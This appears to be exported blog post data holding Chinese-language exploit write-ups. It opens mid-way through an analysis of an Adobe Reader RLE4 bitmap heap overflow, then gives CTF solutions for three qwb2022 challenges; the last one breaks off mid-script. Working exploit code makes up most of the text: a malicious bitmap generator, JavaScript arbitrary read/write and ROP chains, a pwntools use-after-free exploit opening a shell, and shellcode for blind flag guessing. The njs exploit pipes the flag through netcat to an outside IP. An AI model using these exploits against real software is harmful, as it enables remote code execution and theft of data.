ecx  int v35; // eax  int v36; // ecx  int v37; // ecx  unsigned int v38; // esi  int v39; // ecx  unsigned int v40; // edx  char v41; // ah  unsigned int v42; // ecx  int v43; // ebx  int v44; // ecx  int v45; // eax  unsigned int v46; // edx  int v47; // ecx  int v48; // ecx  int v49; // ecx  unsigned int v50; // eax  int v51; // ebx  int v52; // eax  bool v53; // zf  int v54; // ecx  unsigned int xpos; // esi  int v56; // ecx  char v57; // ah  int v58; // edx  unsigned int v59; // ecx  unsigned int v60; // esi  unsigned int v61; // ebx  char v62; // si  int v63; // eax  int v64; // ecx  unsigned int v65; // esi  _DWORD *v66; // ecx  char v67; // bl  int v68; // eax  char v69; // cl  bool v70; // cf  int v71; // ecx  int v72; // ecx  int v73; // ecx  signed int v74; // ebx  int ypos_1; // eax  unsigned int dst_xpos; // ecx  signed int xpos_; // ebx  char index; // cl  signed int byte_slot; // esi  int odd_index; // edx  _DWORD *v81; // ecx  unsigned __int8 _4bits; // bl  int line; // eax  unsigned __int8 _4bits_1; // cl  int v85; // edx  unsigned int v86; // esi  int v87; // ebx  int v88; // eax  int v89; // ecx  int v90; // esi  int v91; // ecx  int v92; // ecx  int v93; // ecx  unsigned int v94; // ebx  unsigned int v95; // ebx  int v96; // eax  int v97; // ecx  int v98; // esi  int v99; // ecx  int v100; // ecx  int v101; // ecx  signed int v102; // [esp-4h] [ebp-7Ch]  signed int v103; // [esp-4h] [ebp-7Ch]  int v104; // [esp-4h] [ebp-7Ch]  char v105; // [esp+10h] [ebp-68h]  void **v106; // [esp+2Ch] [ebp-4Ch]  int v107; // [esp+34h] [ebp-44h]  int v108; // [esp+38h] [ebp-40h]  int v109; // [esp+3Ch] [ebp-3Ch]  char v110; // [esp+44h] [ebp-34h]  int width_1; // [esp+48h] [ebp-30h]  int v112; // [esp+4Ch] [ebp-2Ch]  __int16 v113; // [esp+50h] [ebp-28h]  unsigned __int16 bit_count; // [esp+52h] [ebp-26h]  unsigned int biCompression; // [esp+54h] [ebp-24h]  int v116; // [esp+5Ch] [ebp-1Ch]  int v117; // [esp+60h] [ebp-18h]  unsigned int v118; // [esp+64h] [ebp-14h]  int v119; // [esp+74h] [ebp-4h]  char v120; // [esp+78h] [ebp+0h]  void **v121; // [esp+7Ch] [ebp+4h]  int v122; // [esp+84h] [ebp+Ch]  int v123; // [esp+88h] [ebp+10h]  int v124; // [esp+8Ch] [ebp+14h]  unsigned int v125; // [esp+94h] [ebp+1Ch]  unsigned __int8 xdelta; // [esp+9Bh] [ebp+23h]  int cmd; // [esp+9Ch] [ebp+24h]  char v128; // [esp+A3h] [ebp+2Bh]  int v129; // [esp+A4h] [ebp+2Ch]  __int16 ydelta; // [esp+A8h] [ebp+30h]  unsigned int width; // [esp+ACh] [ebp+34h]  unsigned __int8 v132; // [esp+B3h] [ebp+3Bh]  unsigned int bitmap_ends; // [esp+B4h] [ebp+3Ch]  unsigned int v134; // [esp+B8h] [ebp+40h]  char v135; // [esp+BFh] [ebp+47h]  unsigned int v136; // [esp+C0h] [ebp+48h]  unsigned __int8 low_4bits; // [esp+C6h] [ebp+4Eh]  unsigned __int8 high_4bits; // [esp+C7h] [ebp+4Fh]  unsigned int ypos; // [esp+C8h] [ebp+50h]  char v140; // [esp+CCh] [ebp+54h]  v1 = this;  if ( !this[2] )    _Mtx_lock_2(16479);  fn_read_bytes(&amp;v140, 14);  sub_20D4AFFB(&amp;v110);  v2 = v1[2];  fn_read_bytes(&amp;v110, 40);  if ( v113 != 1 )    goto LABEL_175;  width = 4;  if ( bit_count == 1 )    goto LABEL_9;  if ( bit_count == 4 )  &#123;    if ( !biCompression )      goto LABEL_11;    v3 = biCompression == 2;    goto LABEL_10;  &#125;  if ( bit_count != 8 )  &#123;    if ( bit_count != 24 )    &#123;LABEL_8:      sub_20E0D4B3(&amp;v120, 17996, 0);      goto LABEL_176;    &#125;LABEL_9:    v3 = biCompression == 0;    goto LABEL_10;  &#125;  if ( !biCompression )    goto LABEL_11;  v3 = biCompression == 1;LABEL_10:  if ( !v3 )    goto LABEL_8;LABEL_11:  v4 = bit_count * width_1;  if ( v4 &lt;= 0 || v4 &lt; width_1 || v4 &lt; bit_count )  &#123;    sub_20E0D4B3(&amp;v120, 16479, 0);    goto LABEL_176;  &#125;..................................................................    if ( biCompression == 2 )    &#123;      v54 = v1[2];      xpos = 0;      ypos = v112 - 1;      bitmap_ends = 0;      v136 = 0;      result = fn_feof(v54, v10);      if ( !result )      &#123;        while ( 1 )        &#123;          if ( bitmap_ends )            return result;          v56 = v1[2];          fn_read_bytes(&amp;cmd, 2);          v57 = BYTE1(cmd);          if ( (_BYTE)cmd )            break;          v58 = BYTE1(cmd);          if ( BYTE1(cmd) )          &#123;            if ( BYTE1(cmd) == 1 )            &#123;              v74 = 1;              bitmap_ends = 1;              goto LABEL_152;            &#125;            if ( BYTE1(cmd) != 2 )            &#123;              v59 = ypos;              v60 = BYTE1(cmd) + xpos;              if ( ypos &gt;= height )                goto LABEL_175;              v61 = v136;              if ( v60 &lt; v136 || v60 &lt; BYTE1(cmd) || v60 &gt; width )                goto LABEL_175;              v62 = 0;              v134 = 0;              if ( BYTE1(cmd) )              &#123;                do                &#123;                  v63 = v62 &amp; 1;                  v125 = v62 &amp; 1;                  if ( !(v62 &amp; 1) )                  &#123;                    v64 = v1[2];                    fn_read_bytes(&amp;v132, 1);                    v128 = v132 &amp; 0xF;                    v59 = ypos;                    v135 = v132 &gt;&gt; 4;                    v63 = v125;                  &#125;                  v65 = v61 &gt;&gt; 1;                  v104 = v59;                  v66 = (_DWORD *)v1[3];                  if ( v61 &amp; 1 )                  &#123;                    if ( v63 )                    &#123;                      v68 = fn_get_scanline(v66, v104);                      v69 = v128;                    &#125;                    else                    &#123;                      v68 = fn_get_scanline(v66, v104);                      v69 = v135;                    &#125;                    *(_BYTE *)(v65 + v68) |= v69;                  &#125;                  else                  &#123;                    v67 = v135;                    if ( v63 )                      v67 = v128;                    *(_BYTE *)(fn_get_scanline(v66, v104) + v65) = 16 * v67;                    v61 = v136;                  &#125;                  ++v61;                  v57 = BYTE1(cmd);                  v62 = v134 + 1;                  v70 = v134 + 1 &lt; BYTE1(cmd);                  v136 = v61;                  v59 = ypos;                  ++v134;                &#125;                while ( v70 );              &#125;              if ( (v57 &amp; 3u) - 1 &lt;= 1 )              &#123;                v71 = v1[2];                fn_read_bytes(&amp;v132, 1);              &#125;LABEL_150:              xpos = v136;              goto LABEL_151;            &#125;            v72 = v1[2];            fn_read_bytes(&amp;xdelta, 1);            v73 = v1[2];            fn_read_bytes((char *)&amp;ydelta + 1, 1);            xpos += xdelta;            ypos -= HIBYTE(ydelta);            v136 = xpos;          &#125;          else          &#123;            --ypos;            xpos = 0;            v136 = 0;          &#125;LABEL_151:          v74 = bitmap_ends;LABEL_152:          result = fn_feof(v1[2], v58);          if ( result )          &#123;            v53 = v74 == 0;            goto LABEL_106;          &#125;          height = v129;        &#125;        v58 = (unsigned __int8)cmd;        high_4bits = BYTE1(cmd) &gt;&gt; 4;        ypos_1 = ypos;        low_4bits = BYTE1(cmd) &amp; 0xF;        dst_xpos = (unsigned __int8)cmd + xpos;        if ( ypos &gt;= height )          goto LABEL_175;        if ( (signed int)dst_xpos &gt; (signed int)width )          goto LABEL_175;        xpos_ = v136;        if ( dst_xpos &lt; v136 || dst_xpos &lt; (unsigned __int8)cmd )          goto LABEL_175;        index = 0;        v134 = 0;        if ( (_BYTE)cmd )        &#123;          do          &#123;            byte_slot = xpos_ &gt;&gt; 1;            odd_index = index &amp; 1;            v81 = (_DWORD *)v1[3];            if ( xpos_ &amp; 1 )            &#123;              if ( odd_index )              &#123;                line = fn_get_scanline(v81, ypos_1);                _4bits_1 = low_4bits;              &#125;              else              &#123;                line = fn_get_scanline(v81, ypos_1);                _4bits_1 = high_4bits;              &#125;              *(_BYTE *)(byte_slot + line) |= _4bits_1;            &#125;            else            &#123;              _4bits = high_4bits;              if ( odd_index )                _4bits = low_4bits;              *(_BYTE *)(fn_get_scanline(v81, ypos_1) + byte_slot) = 16 * _4bits;              xpos_ = v136;            &#125;            ++xpos_;            index = v134 + 1;            v70 = v134 + 1 &lt; (unsigned __int8)cmd;            v136 = xpos_;            ypos_1 = ypos;            ++v134;          &#125;          while ( v70 );        &#125;        goto LABEL_150;      &#125;    &#125;LABEL_175:    sub_20E0D4B3(&amp;v120, 17993, 0);LABEL_176:    CxxThrowException(&amp;v120, &amp;_TI2_AVjfExFull__);  &#125;\n从中可以分析出COMPRESSION&#x3D;2，BIT_COUNT &#x3D; 4，这样即当bitmap使用的是REL4压缩算法时，就可以到达漏洞处，接下来分析该bitmap的width和height应该为多少，才能够使得申请的堆落到ArrayBuffer对象之间的堆空洞里，在此处用windbg下断点进行调试首先windbg断点，当AcroForm.api模块被加载时会断下\nsxe ld:AcroForm.api\n然后断点\nbp 0x54bcc8+AcroForm_base\ncall调用的是fn_get_scanline函数，返回的是一个堆地址\n我们查看这个堆的头部以及附近的内容，可以发现其前方0x144处，正是ArrayBuffer的byteLength变量，可见这里，我们堆喷成功，bitmap的解压缩数据堆成功申请到hole里\n此时我们bitmap的WIDTH &#x3D; 0x278，HEIGHT &#x3D; 1，该bitmap的数据解压区正好申请到hole里。并且通过调试，我们确定了溢出的距离为-0x144，无符号数也就是0xfffffebc,即bye_slot应该为0xfffffebc\n\n由于这里xpos_ &gt;&gt; 1是一个有符号数的运算，因此xpos_的值应该为0xfffffd78\n#include &lt;stdio.h&gt;#include &lt;iostream&gt;using namespace std;int main() &#123;\tint a = 0xfffffebc;\tcout &lt;&lt; hex &lt;&lt; (a &lt;&lt; 1) &lt;&lt; endl;&#125; \n而xpos是可以控制的\n于是，我们可以向-0x144的位置写上4字节0xFF，使得ArrayBuffer的byteLength为0xFFFFFFFF\ngen_bitmap.py\n#-*- coding:utf-8 -*-import osimport sysimport structRLE8 = 1RLE4 = 2COMPRESSION = RLE4BIT_COUNT = 4CLR_USED = 1 &lt;&lt; BIT_COUNTWIDTH = 0x278HEIGHT = 1def get_bitmap_file_header(file_size, bits_offset):    return struct.pack(&#x27;&lt;2sIHHI&#x27;, &#x27;BM&#x27;, file_size, 0, 0, bits_offset)def get_bitmap_info_header(data_size):    return struct.pack(&#x27;&lt;IIIHHIIIIII&#x27;,        0x00000028,        WIDTH,        HEIGHT,        0x0001,        BIT_COUNT,        COMPRESSION,        data_size,        0x00000000,        0x00000000,        CLR_USED,        0x00000000)def get_bitmap_info_colors():    # B, G, R, Reserved    rgb_quad = &#x27;\\x00\\x00\\xFF\\x00&#x27;    return rgb_quad * CLR_USEDdef get_bitmap_data():    # set xpos to 0xFFFFFD02    data = &#x27;\\x00\\x02\\xFF\\x00&#x27; * (0xFFFFFD02 / 0xFF)    # set xpos to 0xFFFFFD78    data += &#x27;\\x00\\x02\\x76\\x00&#x27;    # 0x4 bytes of 0xFF    data += &#x27;\\x08\\xFF&#x27;    # mark end of bitmap to skip CxxThrowException    data += &#x27;\\x00\\x01&#x27;    return datadef generate_bitmap(filepath):    data = get_bitmap_data()    data_size = len(data)    bmi_header = get_bitmap_info_header(data_size)    bmi_colors = get_bitmap_info_colors()    bmf_header_size = 0x0E    bits_offset = bmf_header_size + len(bmi_header) + len(bmi_colors)    file_size = bits_offset + data_size    bmf_header = get_bitmap_file_header(file_size, bits_offset)    with open(filepath, &#x27;wb&#x27;) as f:        f.write(bmf_header)        f.write(bmi_header)        f.write(bmi_colors)        f.write(data)if __name__ == &#x27;__main__&#x27;:    if len(sys.argv) != 2:        print &#x27;Usage: %s &lt;output.bmp&gt;&#x27; % os.path.basename(sys.argv[0])        sys.exit(1)    generate_bitmap(sys.argv[1])\n当完成了这一步的修改以后，我们就已经拥有了一个具有任意地址读写的ArrayBuffer对象了，与前面的堆喷布局同理，在pdf的xdp标签里嵌入\n&lt;event activity=&quot;docReady&quot; ref=&quot;$host&quot; name=&quot;event__docReady&quot;&gt;  &lt;script contentType=&quot;application/x-javascript&quot;&gt;  &lt;/script&gt;&lt;/event&gt;\n可以实现图片解析完成以后的后续操作，我们在这里，首先要查找到那个具有任意地址读写的ArrayBuffer对象，由于SpiderMonkey引擎的性质，我们可以在内存里搜索0xf0e0d0c0这个特殊数据，从而能计算出ArrayBuffer对象本身的地址，以便实现后续的读写利用\n      // 漏洞触发后，我们找到那个byteLength被修改为-1的那个ArrayBuffer，通过此ArrayBuffer，可以实现任意地址读写。for (var i = 0; i &amp;lt; spray.array.length; ++i) &#123;   if (spray.array[i] != null &amp;amp;&amp;amp; spray.array[i].byteLength == -1) &#123;            //app.alert(&quot;found idx=&quot; + i);var dv = new DataView(spray.array[i]);for (var j=-100;;j-=4) &#123; //搜索内存，查找堆地址   var x = dv.getUint32(j,true);if (x == 0xf0e0d0c0) &#123;   //得到ArrayBuffer自身的地址   var heap_addr = dv.getUint32(j + 0xC,true) - 0x10 - j;   //app.alert(&quot;heap_addr=&quot; + heap_addr.toString(16));   //得到dataview的地址   var dataview_obj_addr = dv.getUint32(-8,true);   app.alert(&quot;dataview_obj=&quot; + dataview_obj_addr.toString(16));   //得到EScript.api模块的地址   var escript_base = dv.getUint32(dataview_obj_addr + 0xC - heap_addr,true) - 0x275510;   //app.alert(&quot;escript_base=&quot; + escript_base.toString(16));   //计算三个重要的函数的iat表   var LoadLibraryA_iat = escript_base + 0x1af0d8;   var GetProcAddress_iat = escript_base + 0x1af114;   var VirtualProtect_iat = escript_base + 0x1af058;   //泄露函数地址   var LoadLibraryA = dv.getUint32(LoadLibraryA_iat - heap_addr,true);   var GetProcAddress = dv.getUint32(GetProcAddress_iat - heap_addr,true);   var VirtualProtect = dv.getUint32(VirtualProtect_iat - heap_addr,true);&#125;&#125;&#125;      &#125;\n接下来是劫持程序流，通过尝试发现程序开启了CFG控制流保护机制因此劫持虚表为gadget不可用，绕过方法有一些，这里我直接选择劫持栈做ROP。那么得泄露栈地址，在windows下泄露栈地址不太容易，得确定teb、peb的地址，而我这里盲摸索出针对当前Adobe Reader的栈地址搜索方法，即通过dataview对象里的一连串指针，偶然发现一个接近栈地址值的指针，其位置如下\nvar tmp = dv.getUint32(dataview_obj_addr - heap_addr,true);tmp = dv.getUint32(tmp - heap_addr,true);tmp = dv.getUint32(tmp + 0xC - heap_addr,true);//得到一个栈地址var s = dv.getUint32(tmp + 0x8 - heap_addr,true);\n这里得到的s是一个栈地址，但是其地址与函数ret时的esp之间的偏移是会发生变化的，但是变化范围不大，因此可以以该地址为起点进行搜索，直到搜索到getUint32的返回地址时便可以确定具体的栈地址。\n  //搜索栈地址，确定一个稳定的栈地址 var stack_addr = 0; for (var k = s;k &amp;gt; s - 0x1000;k -= 4) &#123;\t\tx = dv.getUint32(k - heap_addr,true);\t\t if (x == escript_base + 0x12e384) &#123;\t\t\tstack_addr = k;\t\t\t //app.alert(&quot;found stack_addr=&quot; + stack_addr.toString(16));\t\t\tbreak;\t\t&#125;&#125;\n接下来就利用任意地址读写，劫持ret时的esp指向的地址处为pop esp ; ret，做栈迁移，可以dv.setFloat64来完成一次性写8字节的目的，这样写完便可以完成栈迁移。\n0x02 感想第一次挖掘真实漏洞，收获挺大\n0x03 参考(深入分析Adobe忽略了6年的PDF漏洞) https://xlab.tencent.com/cn/2019/09/12/deep-analysis-of-cve-2019-8014/\n","categories":["CTF","安全研究"],"tags":["JS引擎漏洞","堆溢出","windows漏洞利用","heap spray","Adobe"]},{"title":"qwb2022_UserManager","url":"/2022/08/12/qwb2022-UserManager/","content":"insert的时候，如果id一样，会释放第二个节点，但是当这个被释放的节点是头部节点时，即users，其位于全局中存储的指针没有清空，造成UAF。\n\n通过UAF控制name指针，然后再结合check功能就能完成数据泄漏。同样，我们可以通过控制left和right指针，可以实现往任意地址写入一个堆地址。\n\n由于libc为uclibc，通过调试发现exit中也存在中类似于_rtld_global的指针，我们将其覆盖为一个堆地址，然后伪造它的结构，在exit时就能实现函数调用。\n#encoding:utf8from pwn import *#sh = process(&#x27;./UserManager&#x27;)sh = remote(&#x27;182.92.161.17&#x27;,32163)libc = ELF(&#x27;./libc.so&#x27;)#sh = gdb.debug(&#x27;./UserManager&#x27;,&#x27;c&#x27;)def add(id,size,content):   sh.sendlineafter(&#x27;:&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;d:&#x27;,str(id))   sh.sendlineafter(&#x27;h:&#x27;,str(size))   sh.sendafter(&#x27;e:&#x27;,content)def show(id):   sh.sendlineafter(&#x27;:&#x27;,&#x27;2&#x27;)   sh.sendlineafter(&#x27;d:&#x27;,str(id))def delete(id):   sh.sendlineafter(&#x27;:&#x27;,&#x27;3&#x27;)   sh.sendlineafter(&#x27;d:&#x27;,str(id))def clear():   sh.sendlineafter(&#x27;:&#x27;,&#x27;4&#x27;)#context.log_level = &#x27;debug&#x27;add(0,0x1000,&#x27;0&#x27;*0x1000)add(7,0x1000,&#x27;1&#x27;*0x1000) #7raw_input()clear()add(10,0x100,&#x27;2&#x27;*0x100)#users UAFadd(10,0x100,&#x27;2&#x27;*0x100)add(9,0x38,&#x27;3&#x27;*0x38)add(8,0x38,&#x27;4&#x27;*0x38)#add(7,0x38,&#x27;\\x00&#x27;*0x38)#raw_input()add(123,0x30,&#x27;\\x00&#x27;*0x20 + p64(0xDEADBEEF) + &#x27;\\n&#x27;)show(123)sh.recv(1)sh.recv(0x20)heap_addr = u64(sh.recv(8))print &#x27;heap_addr=&#x27;,hex(heap_addr)delete(123)add(123,0x30,p64(5) + p64(heap_addr + 0x3a0) + p64(0x8) + p64(0) + p64(0xDEADBEEF) + &#x27;\\n&#x27;)show(5)sh.recv(1)mmap_heap_base = u64(sh.recv(8))print &#x27;mmap_heap_base=&#x27;,hex(mmap_heap_base)delete(123)add(123,0x30,p64(5) + p64(heap_addr - 0xc78) + p64(0x8) + p64(0) + p64(0xDEADBEEF) + &#x27;\\n&#x27;)show(5)sh.recv(1)libc_base = u64(sh.recv(8))  - 0x672e0print &#x27;libc_base=&#x27;,hex(libc_base)&#x27;&#x27;&#x27;delete(123)add(123,0x30,p64(0) + p64(dynamic_addr) + p64(0x8) + p64(2) + p64(0xDEADBEEF) + &#x27;\\n&#x27;)show(0)sh.recv(1)dynamic_addr = u64(sh.recv(8))print &#x27;dynamic_addr=&#x27;,hex(dynamic_addr)&#x27;&#x27;&#x27;#raw_input()rtld_global = libc_base + 0xb6f20print &#x27;rtld_global=&#x27;,hex(rtld_global)ret = libc_base + 0x00000000000152a2pop_rdi = libc_base + 0x00000000000152a1binsh_addr = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()system_addr = libc_base + libc.sym[&#x27;system&#x27;]delete(123)heap7_addr = heap_addr + 0x380add(123,0x38,p64(5) + p64(0) + p64(0x8) + p64(2) + p64(0xDEADBEEF) + p64(rtld_global - 0x20) + p64(0))delete(5)add(124,0x38,&#x27;/bin/sh\\x00&#x27; + p64(0) + p64(13) + p64(0x80) + &#x27;5&#x27;*0x18)add(125,0x38,&#x27;6&#x27;*0x10 + p64(libc_base + 0xb6b08) + &#x27;6&#x27;*0x8 + p64(mmap_heap_base - 0xaa0 + 0xd0) + p64(ret) + &#x27;6&#x27;*0x8)add(126,0x38,&#x27;7&#x27;*0x38)add(127,0x38,&#x27;8&#x27;*0x38)delete(123)clear()#mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]gadget = libc_base + 0x000000000007b1f5add(124,0x38,&#x27;a&#x27;*0x38)add(125,0x100,&#x27;b&#x27;*0x100)add(126,0x38,&#x27;c&#x27;*0x38)add(127,0x38,&#x27;d&#x27;*0x38)add(128,0x38,p64(gadget - 0x80) + &#x27;e&#x27;*0x8 + p64(heap_addr + 0x40) + p64(libc_base + 0xb6900) + &#x27;e&#x27;*0x18)add(129,0x38,&#x27;f&#x27;*0x38)add(129,0x38,&#x27;g&#x27;*0x38)clear()rtld_flag = heap_addr + 0xa8add(10,0x100,&#x27;2&#x27;*0x100)#users UAFadd(10,0x100,&#x27;2&#x27;*0x100)add(9,0x38,&#x27;3&#x27;*0x38)#raw_input()add(5,0x38,p64(5) + p64(0) + p64(0x8) + p64(2) + p64(0xDEADBEEF) + p64(rtld_flag - 0x20) + p64(0))add(123,0x100,&#x27;a&#x27;*0xd0 + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr) + &#x27;\\n&#x27;)sh.interactive()","categories":["CTF"],"tags":["UAF","linkmap","dl_resolve"]},{"title":"qwb2022_njs","url":"/2022/08/12/qwb2022-njs/","content":"这是一个不错的题，非常适合学习js引擎的漏洞利用方法。题目给了patch如下\ndiff --git a/njs/src/njs_typed_array.c b/njs1/src/njs_typed_array.cindex 9242159..bc9d10b 100644--- a/njs/src/njs_typed_array.c+++ b/njs1/src/njs_typed_array.c@@ -2588,7 +2588,7 @@ njs_data_view_constructor(njs_vm_t *vm, njs_value_t *args, njs_uint_t nargs,             return NJS_ERROR;         &#125; -        if (njs_slow_path((offset + size) &gt; buffer-&gt;size)) &#123;+        if (njs_slow_path((offset + size) &gt; buffer-&gt;size + 0x29)) &#123;             njs_range_error(vm, &quot;Invalid DataView length: %uL&quot;, size);             return NJS_ERROR;         &#125;\n很明显，这是制造了一个溢出漏洞，可以通过如下代码构造溢出\nvar d = new DataView(new ArrayBuffer(0x38),0,0x61);\n通过调试，我们可以发现，通过DataView对ArrayBuffer进行溢出，可以溢出到下一个对象的__proto__属性，在内存中，它是一个指针，指向了对应的__proto__对象，如果我们将该指针覆盖指向可控位置，然后再通过var o &#x3D; obj.__proto就可以获得伪造的js对象。同理，我们对obj.__protp__进行赋值为某个对象，然后通过溢出读取指针，就能知道对象的对象。因此，我们能够实现fakeObject和addressOf原语，有了这个，直接伪造一个ArrayBuffer对象进行任意地址读写。\nfunction addressOf(obj) &#123;   evil_after.__proto__ = obj;   return [arrs[evil_idx].getUint32(0x50,true),arrs[evil_idx].getUint32(0x54,true)];&#125;function fakeObj(addr_low,addr_high) &#123;   arrs[evil_idx].setUint32(0x50,addr_low,true);   arrs[evil_idx].setUint32(0x54,addr_high,true);   return evil_after.__proto__;&#125;\n我们使用了堆喷射(Heap Spray)，即最开始构造了N个对象，然后通过溢出覆盖__proto__，再遍历这些对象，查看它们的__proto__是否被改变，从而，我们能够确定具体是哪个对象被溢出到了。\nvar arrs = Array(0x100);for (var i=0;i&lt;0x100;i++) &#123;   arrs[i] = new DataView(new ArrayBuffer(0x38),0,0x61);   for (var j=0;j&lt;0x38;j++) &#123;      arrs[i].setUint8(j,i + 1);   &#125;&#125;var evil_idx = 80;var arraybuf_proto = arrs[evil_idx].getFloat64(0x50,true);//确定evil前方是哪个buffervar obj = [1.1,2.2]var evil_after;for (var i=0;i&lt;0x100;i++) &#123;   var tmp_proto = arrs[i].buffer.__proto__;   arrs[i].buffer.__proto__ = obj   if (arrs[evil_idx].getFloat64(0x50,true) != arraybuf_proto) &#123;      evil_after = arrs[i].buffer;      print(&quot;found evil after at idx:&quot; + i);      break;   &#125;   arrs[i].buffer.__proto__ = tmp_proto;&#125;\n具体的exp如下\nvar arrs = Array(0x100);for (var i=0;i&lt;0x100;i++) &#123;   arrs[i] = new DataView(new ArrayBuffer(0x38),0,0x61);   for (var j=0;j&lt;0x38;j++) &#123;      arrs[i].setUint8(j,i + 1);   &#125;&#125;var evil_idx = 80;var arraybuf_proto = arrs[evil_idx].getFloat64(0x50,true);//确定evil前方是哪个buffervar obj = [1.1,2.2]var evil_after;for (var i=0;i&lt;0x100;i++) &#123;   var tmp_proto = arrs[i].buffer.__proto__;   arrs[i].buffer.__proto__ = obj   if (arrs[evil_idx].getFloat64(0x50,true) != arraybuf_proto) &#123;      evil_after = arrs[i].buffer;      print(&quot;found evil after at idx:&quot; + i);      break;   &#125;   arrs[i].buffer.__proto__ = tmp_proto;&#125;function addressOf(obj) &#123;   evil_after.__proto__ = obj;   return [arrs[evil_idx].getUint32(0x50,true),arrs[evil_idx].getUint32(0x54,true)];&#125;function fakeObj(addr_low,addr_high) &#123;   arrs[evil_idx].setUint32(0x50,addr_low,true);   arrs[evil_idx].setUint32(0x54,addr_high,true);   return evil_after.__proto__;&#125;var buf = new ArrayBuffer(0x8);var dv = new DataView(buf);function p64f(value1,value2) &#123;   dv.setUint32(0,value1,true);   dv.setUint32(0x4,value2,true);   return dv.getFloat64(0,true);&#125;function u64f(value) &#123;   dv.setFloat64(0,value,true);   return [dv.getUint32(0,true),dv.getUint32(4,true)];&#125;var buffer_proto = addressOf(buf.__proto__);var zero = p64f(0,0);var fakeObj_buf = new Float64Array(8);fakeObj_buf[0] = zero;fakeObj_buf[1] = zero;fakeObj_buf[2] = p64f(buffer_proto[0],buffer_proto[1]);fakeObj_buf[3] = zero;fakeObj_buf[4] = p64f(0x00010018,0);fakeObj_buf[5] = p64f(0x1000,0);fakeObj_buf[6] = p64f(0x12,0x34);var func_addr = addressOf(fakeObj);var buf_addr = addressOf(buf);var f = addressOf(fakeObj_buf.buffer);var fake_obj_addr_low = f[0] + 0x40;print(&quot;func_addr=0x&quot; + func_addr[1].toString(16) + func_addr[0].toString(16));print(&quot;buf_addr=0x&quot; + buf_addr[1].toString(16) + buf_addr[0].toString(16));print(&quot;f=0x&quot; + f[1].toString(16) + f[0].toString(16));print(&quot;fakeObj_addr=0x&quot; + f[1].toString(16) + fake_obj_addr_low.toString(16));var arb_arraybuffer = fakeObj(fake_obj_addr_low,f[1]);var arb_dv = new DataView(arb_arraybuffer);function read64(addr_l,addr_h) &#123;   fakeObj_buf[6] = p64f(addr_l,addr_h);   return u64f(arb_dv.getFloat64(0,true));&#125;function write64(addr_l,addr_h,value) &#123;   fakeObj_buf[6] = p64f(addr_l,addr_h);   arb_dv.setFloat64(0,value,true);&#125;function writeb(addr_l,addr_h,value) &#123;   fakeObj_buf[6] = p64f(addr_l,addr_h);   arb_dv.setUint8(0,value);&#125;print(arb_dv.byteLength);var tmp = read64(func_addr[0] + 0x10,func_addr[1]);print(&quot;tmp_addr=0x&quot; + tmp[1].toString(16) + tmp[0].toString(16));var elf_addr = read64(tmp[0] + 0x30,tmp[1]);var elf_base = elf_addr[0] - 0x37f80;var write_got = elf_base + 0xC4B38;var libc_addr = read64(write_got,elf_addr[1]);var libc_base = libc_addr[0] - 0x10e060;var environ_addr = libc_base + 0x1EF600;var stack_addr = read64(environ_addr,libc_addr[1]);var rop_addr = stack_addr[0] - 0x108;var system_addr = libc_base + 0x52290;var pop_rdi = libc_base + 0x248f2;var binsh_addr = libc_base + 0x1B45BD;print(&quot;elf_base=0x&quot; + elf_addr[1].toString(16) + elf_base.toString(16));print(&quot;libc_base=0x&quot; + libc_addr[1].toString(16) + libc_base.toString(16));print(&quot;stack_addr=0x&quot; + stack_addr[1].toString(16) + stack_addr[0].toString(16));write64(rop_addr,stack_addr[1],p64f(pop_rdi,libc_addr[1]));write64(rop_addr + 8,stack_addr[1],p64f(rop_addr + 32,stack_addr[1]));write64(rop_addr + 24,stack_addr[1],p64f(system_addr,libc_addr[1]));var cmd = &quot;cat flag | nc 198.23.196.15 2334\\x00&quot;;for (var i=0;i&lt;cmd.length;i++) &#123;   writeb(rop_addr + 32 + i,stack_addr[1],cmd.charCodeAt(i));&#125;","categories":["CTF"],"tags":["JS引擎漏洞","堆溢出","heap spray"]},{"title":"qwb2022_yakacmp","url":"/2022/08/12/qwb2022-yakacmp/","content":"当mov的次数超过10时，会生成push immediate的指令，由于push指令在cpu解析执行时，最多为4字节，于是会导致immediate立即数中后4字节成为指令。\n\n因此，我们可以将需要的一些指令放入立即数中，比如syscall，通过构造read继续输入数据，并将数据存放于当前片段的后方。我们可以将后续的shellcode从这个read中输入。禁用了write，因此只能进行flag的盲注\n\n#coding:utf8from pwn import *context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;)import time#context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level = &#x27;critical&#x27;)#flag里面可能出现的字符possible_char = []#字符的顺序可以影响效率，让频率最高的字符放前面for x in range(0,10):   possible_char.append(str(x))for x in range(ord(&#x27;a&#x27;),ord(&#x27;z&#x27;)+1):   possible_char.append(chr(x))possible_char.append(&#x27;&#123;&#x27;)possible_char.append(&#x27;-&#x27;)possible_char.append(&#x27;_&#x27;)possible_char.append(&#x27;&#125;&#x27;)possible_char.append(&#x27;\\x00&#x27;)OK = Falseflag = &#x27;&#x27;index = 0while not OK:   print &#x27;guess (&#x27;,index,&#x27;) char&#x27;   length = len(flag)   for guess_char in possible_char:      #sh = process(&#x27;./yakacmp&#x27;)      sh = remote(&#x27;47.93.52.218&#x27;,20848)      code = (&#x27;mov r2,%d\\n&#x27; % (0x6666666666666666))*10      code += &#x27;mov r2,%d\\n&#x27; % 0x58ff314800000000      code += &#x27;mov r2,%d\\n&#x27; % 0x53d2314800000000      code += &#x27;mov r2,%d\\n&#x27; % 0x53ffb25e233300a9      #syscall      code += &#x27;mov r1,%d\\n&#x27; % (0x050F905b66666666)      sh.sendlineafter(&#x27;now&#x27;,code)      for i in range(14):         sh.recvuntil(&#x27;more operation?&#x27;)      #raw_input()      sh.sendline(&#x27;NO&#x27;)      sh.recvuntil(&#x27;over&#x27;)      shellcode = asm(&#x27;&#x27;&#x27;         mov rax,0x2         mov rdi,0x67616c662f2e         push rdi         lea rdi,[rsp]         mov rsi,0         syscall         mov rdi,rax         lea rsi,[rsp]         mov rdx,0x50         xor rax,rax         syscall      compare:         cmp byte ptr[rsp+%d],%d         jz compare         ret      &#x27;&#x27;&#x27; % (index,ord(guess_char)))      sleep(1)      #raw_input()      sh.sendline(shellcode)      #sleep(1)      sh.sendline(&#x27;a&#x27;*0x6000)      #sh.interactive()      start = time.time()      sh.recvall(timeout = 6)      end = time.time()      #raw_input()      #sh.interactive()      